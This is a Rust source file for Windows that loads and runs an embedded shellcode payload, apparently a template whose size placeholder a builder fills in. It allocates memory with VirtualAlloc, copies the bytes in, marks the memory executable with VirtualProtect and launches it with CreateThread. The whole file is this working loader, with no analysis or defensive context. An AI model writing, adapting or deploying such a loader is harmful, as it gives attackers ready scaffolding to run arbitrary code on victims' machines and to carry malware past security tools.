use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../shellcode");
    const SIZE_HOLDER: &str = "$$99999$$";
    let shellcode_len = usize::from_str_radix(SIZE_HOLDER, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    let shellcode_size = shellcode.len();

    unsafe {
        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            panic!("[-]CreateThread failed: {}!", GetLastError());
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
